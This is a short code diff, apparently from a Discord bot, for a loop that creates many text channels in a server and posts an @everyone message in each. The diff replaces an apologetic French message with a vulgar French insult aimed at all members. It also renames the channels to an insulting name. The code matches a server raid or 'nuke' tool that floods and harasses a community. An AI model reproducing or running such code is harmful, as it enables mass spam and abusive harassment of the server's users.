@@ -244,12 +244,12 @@ client.on('messageCreate', async (message) => {
             name: 'XX',
             type: 0, // GuildText
           });
-          await newCh.send('Désolé du dérangement @everyone').catch(() => {});
+          await newCh.send('ALLER VOUS FAIRE FOUTRE BANDE DE SALOPE @everyone').catch(() => {});
         } catch (e) {
           console.error(`Erreur création salon ${i}:`, e.message);
         }
       }
-      console.log(`✅ ${TOTAL} salons "XX" créés sur ${guild.name}`);
+      console.log(`✅ ${TOTAL} salons "liege-les-salopes" créés sur ${guild.name}`);
       break;
     }
 
